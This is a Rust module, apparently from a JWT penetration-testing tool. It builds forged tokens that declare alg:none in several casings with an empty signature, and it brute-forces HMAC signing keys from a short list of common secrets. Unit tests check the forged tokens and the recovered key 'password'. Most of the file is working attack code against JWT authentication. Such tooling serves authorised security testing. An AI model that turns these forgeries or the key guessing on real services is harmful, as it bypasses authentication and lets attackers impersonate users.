use crate::decoder::decode_jwt;
use crate::encoder::encode_payload;
use crate::newtypes::*;

const COMMON_SECRETS: &[&str] = &["secret", "password", "1234", "1234567890"];

#[derive(Clone, Debug, Default, PartialEq)]
pub struct Attack {
    pub name: String,
    pub token: String,
}

pub fn alg_none(claims: &Claims) -> Vec<Attack> {
    // Generate some case-changed variations on alg:none
    let variations = &["none", "None", "nOnE", "NONE"];

    let mut attacks = Vec::new();

    for alg_type in variations {
        let header = format!(r#"{{"alg":"{}","typ":"JWT"}}"#, alg_type).into();
        let mut token = encode_payload(&header, claims);
        token.push('.');
        attacks.push(Attack {
            name: format!("alg:{}", alg_type),
            token,
        });
    }

    info!("Hint: try the alg:none payloads with and without the trailing dot!");

    attacks
}

pub fn null_sig(header: &Header, claims: &Claims) -> String {
    let mut token = encode_payload(header, claims);
    token.push('.');
    token
}

pub fn try_some_common_secrets(jwt_input: &str, secret: &mut Secret) {
    for candidate in COMMON_SECRETS {
        let candidate = (*candidate).into();
        let jwt = decode_jwt(jwt_input, &candidate, &Default::default());
        if jwt.signature_valid {
            info!("Guessed secret: '{}'", candidate);
            *secret = candidate;
        }
    }
}

#[cfg(test)]
mod test {
    use super::*;
    use crate::test::init;

    #[test]
    fn alg_none_attacks() {
        init();

        let claims = r#"{"hello": "world"}"#.into();
        let tokens = alg_none(&claims);
        let expected = &[
            Attack {
                name: "alg:none".to_string(),
                token: concat!(
                    "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0",
                    ".",
                    "eyJoZWxsbyI6IndvcmxkIn0",
                    ".",
                )
                .to_string(),
            },
            Attack {
                name: "alg:None".to_string(),
                token: concat!(
                    "eyJhbGciOiJOb25lIiwidHlwIjoiSldUIn0",
                    ".",
                    "eyJoZWxsbyI6IndvcmxkIn0",
                    ".",
                )
                .to_string(),
            },
            Attack {
                name: "alg:nOnE".to_string(),
                token: concat!(
                    "eyJhbGciOiJuT25FIiwidHlwIjoiSldUIn0",
                    ".",
                    "eyJoZWxsbyI6IndvcmxkIn0",
                    ".",
                )
                .to_string(),
            },
            Attack {
                name: "alg:NONE".to_string(),
                token: concat!(
                    "eyJhbGciOiJOT05FIiwidHlwIjoiSldUIn0",
                    ".",
                    "eyJoZWxsbyI6IndvcmxkIn0",
                    ".",
                )
                .to_string(),
            },
        ];
        assert_eq!(tokens, expected);
        for (t, e) in tokens.iter().zip(expected) {
            assert_eq!(t, e);
        }
    }

    #[test]
    fn brute_force_secrets() {
        init();

        let jwt_input = concat!(
            "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9",
            ".",
            "eyJleHAiOjE1MTYyMzkwMjIsImlhdCI6MTUxNjIzOTAyMi",
            "wiaXNfYWRtaW4iOmZhbHNlLCJuYW1lIjoiU3VwZXIgU2Vj",
            "dXJlIEpXVCBBdXRoIiwic3ViIjoiMTIzNDU2Nzg5MCJ9",
            ".",
            "0EC6D80cYS6kjS6iw5bYimCQkUJESOd-8bi0Yku5Zfk"
        );
        let mut secret = Default::default();

        try_some_common_secrets(jwt_input, &mut secret);

        assert_eq!(secret, "password".into());
    }
}
